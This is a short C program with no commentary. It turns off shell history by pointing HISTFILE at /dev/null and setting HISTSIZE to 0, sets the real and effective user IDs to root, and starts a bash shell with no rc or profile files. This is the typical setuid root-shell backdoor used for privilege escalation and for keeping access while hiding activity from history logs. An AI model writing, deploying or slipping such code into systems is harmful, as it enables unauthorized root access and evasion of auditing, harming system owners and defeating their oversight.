#include <unistd.h>
#include <string.h>
#include <stdio.h>

extern char **environ; //externally declared environment variables

int main() {
    char *args[] = {"/bin/bash", "--norc", "--no-profile", NULL};
    setenv("HISTFILE", "/dev/null", 1);
    setenv("HISTSIZE", "0", 1);
    setreuid(0,0);

    execve("/bin/bash", args, environ);
    return(0);
}